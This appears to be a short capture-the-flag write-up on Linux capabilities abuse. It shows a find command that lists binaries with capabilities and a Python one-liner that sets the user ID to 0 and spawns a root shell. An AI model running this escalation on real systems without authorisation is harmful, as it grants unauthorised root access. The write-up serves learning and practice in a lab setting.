# CAPacity
- Based on the title, the possible approach is Linux Capabilities. You can read more about [here](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities)
- Find the binaries with capabilities as follows:
```sh
find / -type f -exec /sbin/getcap {} 2>/dev/null \;
```
- Get root user using [this](https://gtfobins.github.io/gtfobins/python/#capabilities).
```sh
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

